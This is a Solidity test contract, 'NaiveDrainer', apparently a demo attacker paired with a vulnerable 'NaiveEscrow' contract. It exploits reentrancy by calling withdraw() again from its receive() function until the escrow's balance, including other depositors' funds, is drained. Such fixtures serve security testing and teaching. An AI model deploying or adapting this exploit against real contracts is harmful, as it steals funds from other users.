// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {NaiveEscrow} from "./NaiveEscrow.sol";

/// @title NaiveDrainer
/// @notice TEST/DEMO ATTACKER — never deploy outside the local chain.
/// @dev Holds a small legitimate credit in a NaiveEscrow, then re-enters `withdraw()` from `receive()`
///      until the escrow can no longer cover its credit. Other depositors' funds are taken.
contract NaiveDrainer {
    NaiveEscrow public immutable escrow;
    uint256 public reentries;

    constructor(NaiveEscrow escrow_) {
        escrow = escrow_;
    }

    function attack() external {
        escrow.withdraw();
    }

    receive() external payable {
        if (address(escrow).balance >= escrow.credits(address(this))) {
            reentries++;
            escrow.withdraw();
        }
    }
}
